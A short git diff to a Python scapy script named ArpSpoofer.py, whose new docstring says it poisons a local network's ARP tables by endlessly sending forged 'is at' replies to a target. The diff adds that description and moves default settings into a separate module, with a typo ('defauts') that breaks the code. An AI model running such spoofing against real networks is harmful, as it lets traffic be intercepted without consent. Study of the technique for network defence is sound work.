@@ -1,8 +1,18 @@
+'''
+ArpSpoofer.py by Amitai Farber 1/2021
+
+This script prforming an arp spoofing on the local newtwork.
+It doing so by constantly sending 'is at' responses to the attacked
+computer with our mac and the desired IP, so that the attacked computer thinks
+that we are the ip we sent him.
+'''
+
 from time import sleep
 import argparse
 import netifaces
 from scapy.all import *
 from getmac import get_mac_address as gma
+import defaults
 
 
 def main(args):
@@ -15,20 +25,19 @@ def main(args):
     got_src = True
 
     if not iface:
-        iface = 'eth0'
+        iface = defaults.iface
     if not src:
         got_src = False
         src = get_gw_ip(iface)
     if not delay:
-        delay = 1
+        delay = defauts.delay
     if not gw:
-        gw = False
+        gw = defaults.gw
 
     gw_ip = get_gw_ip(iface)
     target_mac = get_mac_by_ip(target)
     gw_mac = get_mac_by_ip(gw_ip)
     my_mac = gma()
-    # my_mac = ':'.join(("%012X" % my_mac)[i:i+2] for i in range(0, 12, 2))
 
     while True:
         send_ARP_response(iface, src, target, gw, gw_ip, target_mac, my_mac, gw_mac, got_src)
